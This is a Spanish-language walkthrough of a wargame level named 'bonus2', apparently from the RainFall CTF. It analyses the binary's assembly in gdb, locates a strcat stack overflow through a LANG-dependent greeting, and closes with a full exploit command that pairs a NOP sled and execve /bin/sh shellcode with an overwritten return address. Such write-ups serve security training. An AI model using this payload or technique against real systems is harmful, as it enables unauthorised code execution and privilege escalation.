1.- Procedimiento abitual y vemos 2 funciones de cierto interes
  [...]
  0x08048484  greetuser
  0x08048529  main
  [...]

2.- Analicemos el main() lo que vemos es la construcion del stack frame y la reserva de 160 bytes
  [...]
  0x08048529 <+0>:	push   ebp                
  0x0804852a <+1>:	mov    ebp,esp
  0x0804852c <+3>:	push   edi
  0x0804852d <+4>:	push   esi
  0x0804852e <+5>:	push   ebx
  0x0804852f <+6>:	and    esp,0xfffffff0     ;Alineamiento
  0x08048532 <+9>:	sub    esp,0xa0           ;el stack mide 160 bytes 
  [...]

3.- Seguimos la ejecución y vemos que comprueba que argc sea 3 de lo contrario termina con 1
  [...]
  0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3  ;compara argc con 3
  0x0804853c <+19>:	je     0x8048548 <main+31>      ;si es 3 continua
  0x0804853e <+21>:	mov    eax,0x1                
  0x08048543 <+26>:	jmp    0x8048630 <main+263>     ;salta al final del main y sale
  [...]

4.- Luego prepara una llamada a void *memset(void *s, int c, size_t n)
  [...]
  0x08048548 <+31>:	lea    ebx,[esp+0x50]               ;primer parametro de memset (void *s)
  0x0804854c <+35>:	mov    eax,0x0                      ;segundo parámetro          (int c)
  0x08048551 <+40>:	mov    edx,0x13                     ;tercer parametro           (size_t n) 
  0x08048556 <+45>:	mov    edi,ebx
  0x08048558 <+47>:	mov    ecx,edx
  0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax     ;el memset()
  [...]
  El parámetro (size_t n) tenemos que calularlo multiplicando x4 el valor que le pasamos, en este caso 0x13
  quedando (0x13 * 0x4) = 0x4c -> 76 en decimal, quedando la llamada  memset(buff, 0, 76);

5.- A continuación prepara un strncpy de esta manera strcpy(buff, argv[1], 40)
  [...]
  0x0804855c <+51>:	mov    eax,DWORD PTR [ebp+0xc]        ;argv
  0x0804855f <+54>:	add    eax,0x4                        ;&argv[1]
  0x08048562 <+57>:	mov    eax,DWORD PTR [eax]            ;valor de argv[1]
  0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28       ;40 en decimal
  0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax        ;eax es argv[1]
  0x08048570 <+71>:	lea    eax,[esp+0x50]                 ;dirección de buff
  0x08048574 <+75>:	mov    DWORD PTR [esp],eax
  [...]

6.- Prepara otra llamada a strncpy pero de esta otra manera strncpy(buff[40], argv[2], 32)
  [...]
  0x0804857c <+83>:	mov    eax,DWORD PTR [ebp+0xc] 
  0x0804857f <+86>:	add    eax,0x8                        ;&argv[2]
  0x08048582 <+89>:	mov    eax,DWORD PTR [eax]            ;valor de argv[2]
  0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20       ;32 en decimal
  0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax        ;eax es argv[2]
  0x08048590 <+103>:	lea    eax,[esp+0x50]               ;eax es buff
  0x08048594 <+107>:	add    eax,0x28                     ;se desplaza a buff[40]
  0x08048597 <+110>:	mov    DWORD PTR [esp],eax          ;ahora eax es buff[40] que se pasa como primer parámetro
  0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
  [...]

7.- Prepara una llamada a getenv() y el parámetro es la cadena "LANG"
  [...]
  0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738    ;cadena "LANG"
  0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
  [...]
  Si getenv("LANG") devuelve 0x0 salta a <main+239>
  [...]
  0x080485a6 <+125>:	call   0x8048380 <getenv@plt>       ;llamada a getenv("LANG")
  0x080485ab <+130>:	mov    DWORD PTR [esp+0x9c],eax     ;almacena la respuesta en esp+x9c
  0x080485b2 <+137>:	cmp    DWORD PTR [esp+0x9c],0x0     ;hace la comparación del return de getenv con 0x0
  0x080485ba <+145>:	je     0x8048618 <main+239>         ;de ser 0x0 salta a <main+239>
  [...]

8.- Luego hace una serie de comparaciones para setear una variable global denominada language por medio de if y llamadas
  a memcmp;
  [...]
  (gdb) info variables
  0x08049988  language

  [...]
  0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2          ;3º argumento de memcmp()
  0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d    ;string "fi"
  0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c]         ;resultado de getenv() (env)
  0x080485d3 <+170>:	mov    DWORD PTR [esp],eax
  0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>           
  0x080485db <+178>:	test   eax,eax                          ;comprueba si eax es 0x0
  0x080485dd <+180>:	jne    0x80485eb <main+194>             ;si eax != 0x0 salta a <main+194>
  0x080485df <+182>:	mov    DWORD PTR ds:0x8049988,0x1       ;si eax == 0x0 setea la variable global language = 0x1
  0x080485e9 <+192>:	jmp    0x8048618 <main+239> 
  0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2          ;3º argumento de memcmp()
  0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740    ;string "nl"
  0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c]         ;resultado de getenv() (env)
  0x08048602 <+217>:	mov    DWORD PTR [esp],eax
  0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
  0x0804860a <+225>:	test   eax,eax                          ;comprueba eax es 0x0
  0x0804860c <+227>:	jne    0x8048618 <main+239>             ;si eax != 0x0 salta a <main+239>
  0x0804860e <+229>:	mov    DWORD PTR ds:0x8049988,0x2       ;si eax == 0x0 setea la variable language = 0x2
  [...]

9.- Luego prepara una llamada a una función llamada greetuser y como único argumento buff para luego terminar
  [...]
  0x08048618 <+239>:	mov    edx,esp
  0x0804861a <+241>:	lea    ebx,[esp+0x50]
  0x0804861e <+245>:	mov    eax,0x13
  0x08048623 <+250>:	mov    edi,edx
  0x08048625 <+252>:	mov    esi,ebx
  0x08048627 <+254>:	mov    ecx,eax
  0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  0x0804862b <+258>:	call   0x8048484 <greetuser>
  [...]

10.- Veamos que esconde greetuser. Parece que reserva una cantidad de 72 bytes en el stack frame de esta funcion 
  [...]
  0x08048484 <+0>:	push   ebp
  0x08048485 <+1>:	mov    ebp,esp
  0x08048487 <+3>:	sub    esp,0x58
  [...]

11.- Comprueba el valor de la variable global language y en función del resultado salta 
  a un punto dentro de la función.
  [...]
  0x0804848a <+6>:	mov    eax,ds:0x8049988             ;adr variable global language
  0x0804848f <+11>:	cmp    eax,0x1
  0x08048492 <+14>:	je     0x80484ba <greetuser+54>
  0x08048494 <+16>:	cmp    eax,0x2
  0x08048497 <+19>:	je     0x80484e9 <greetuser+101>
  0x08048499 <+21>:	test   eax,eax                      ;compara con 0x0
  0x0804849b <+23>:	jne    0x804850a <greetuser+134>
  [...]

12.- Vamos a evaluar los distintos saltos

13.- Si eax=0x0 coge la cadena "Hello " de 0x8048710 y la copia en ebp-0x48, es como hacer strcpy(local_buff, "Hello ")
  [...]
  0x0804849d <+25>:	mov    edx,0x8048710                ;str "Hello "
  0x080484a2 <+30>:	lea    eax,[ebp-0x48]               ;buff local
  0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx]          ;copia en ecx los 4 primers bytes de "Hello " -> "Hell"
  0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx          ;los pasa eax
  0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4]       ;mueve lo siguentes 2 bytes de "Hello " a ecx ->  "o "
  0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx        ;copia "o " en eax+0x4. Ahora eax = "Hello "
  0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+0x6]       ;copia el último bite "\0" en edx
  0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl        ;lo pone al final de eax 
  0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>    
  [...]

14.- Si eax=0x1. Hace lo mismo que en el paso anterior pero con la cadena de 0x8048717 que es "Hyvää päivää "
  strcpy(local_buff, "Hyvää päivää ")
  [...]
  0x080484ba <+54>:	mov    edx,0x8048717                ;str "Hyvää päivää "
  0x080484bf <+59>:	lea    eax,[ebp-0x48]
  0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
  0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
  0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+0x4]
  0x080484c9 <+69>:	mov    DWORD PTR [eax+0x4],ecx
  0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+0x8]
  0x080484cf <+75>:	mov    DWORD PTR [eax+0x8],ecx
  0x080484d2 <+78>:	mov    ecx,DWORD PTR [edx+0xc]
  0x080484d5 <+81>:	mov    DWORD PTR [eax+0xc],ecx
  0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+0x10]
  0x080484dc <+88>:	mov    WORD PTR [eax+0x10],cx
  0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+0x12]
  0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl
  0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
  [...]

15.- Si eax=0x2. Lo mismo que antes pero sobre la cadena de 0x804872a  "Goedemiddag! "
  [...]
  0x080484e9 <+101>:	mov    edx,0x804872a              ;str  "Goedemiddag! "
  0x080484ee <+106>:	lea    eax,[ebp-0x48]
  0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]
  0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx
  0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+0x4]
  0x080484f8 <+116>:	mov    DWORD PTR [eax+0x4],ecx
  0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+0x8]
  0x080484fe <+122>:	mov    DWORD PTR [eax+0x8],ecx
  0x08048501 <+125>:	movzx  edx,WORD PTR [edx+0xc]
  0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx
  0x08048509 <+133>:	nop

16.- Todas la bifurcaciones convergen en <greetuser+134>

17.- Continuamos y vemos que realiza un strcat del parametro de la función greetuser(buff) y local_buff
  strcat(local_buff, buff)
  [...]
  0x0804850a <+134>:	lea    eax,[ebp+0x8]              ;argumento de greetuser()
  0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax    ;2º parametro de strcat() -> buff
  0x08048511 <+141>:	lea    eax,[ebp-0x48]             ;local_buff
  0x08048514 <+144>:	mov    DWORD PTR [esp],eax        ;1º parametro de strcat() -> local_buff
  0x08048517 <+147>:	call   0x8048370 <strcat@plt>     
  [...]

18.- Por último hace un puts de local_buff puts(local_buff)
  [...]
  0x0804851f <+155>:	mov    DWORD PTR [esp],eax
  0x08048522 <+158>:	call   0x8048390 <puts@plt>
  [...]

19.- Explotación

20.- Sabemos que el primer buff, donde se guarda argv[1] es de 40 bytes, ya tenemos el tamaño de argv[1]. Buscaremos 
  con el patron donde rompe.
(gdb) r $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x08006241 in ?? ()
(gdb) info registers 
eax            0x4f	79
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xbffffae0	-1073743136
esp            0xbffffa90	0xbffffa90
ebp            0x39614138	0x39614138 <-- rompe en ebp!!!!!!
esi            0xbffffb2c	-1073743060
edi            0xbffffadc	-1073743140
eip            0x8006241	0x8006241
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

21.- Mal!!! Rompe en ebp. Esto es porque no tenemos la variable de entorno "LANG" seteada a un valor. Usaremos export LANG='nl'
[...]
(gdb) r $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? ()
[...]

22.- Ahora si rompe en eip y necesitamos un offset de 23 en argv[2]

23.- Buscamos donde se almacena argv[1]
[...]
(gdb) disassembler greetuser
[...]
0x08048514 <+144>:	mov    DWORD PTR [esp],eax
0x08048517 <+147>:	call   0x8048370 <strcat@plt>
0x0804851c <+152>:	lea    eax,[ebp-0x48] <------ Breakpoint
0x0804851f <+155>:	mov    DWORD PTR [esp],eax
[...]
(gdb) b *0x0804851c
(gdb) r $(python -c 'print "A"*40') BBBB <-- Hay que forzar a sobrescribir el null con argv[1]
[...]
(gdb) x/s $eax
0xbffffb20:	"Goedemiddag! AAAA"
[...]

24.- Vemos que la dirección de retorno de strcat() es 0xbffffb20 pero si saltamos directamente a ella saltaria al principio de la cadena "Goedemiddag! ".
  Tenemos que desplazarnos +13 bytes quedando la dirección a saltar 0xbffffb2d. Lo comprobamos
  (gdb) x/s 0xbffffb2d
  0xbffffb2d:	"AAAA"

25.- Montamos el payload
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "\x90" * 19 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') $(python -c 'print "A"*23 + "\x2d\xfb\xff\xbf"')
(insertamos "\x90" al principio para asegurarnos la ejecución del shellcode)

Argv[1] -> ["\x90"* 19 + shellcode(21 bytes)] Argv[2] -> [offset + (adr return strcat() + 13)]
              ^                                                               |
              |----------------------------------------------------------------

26.- Listo
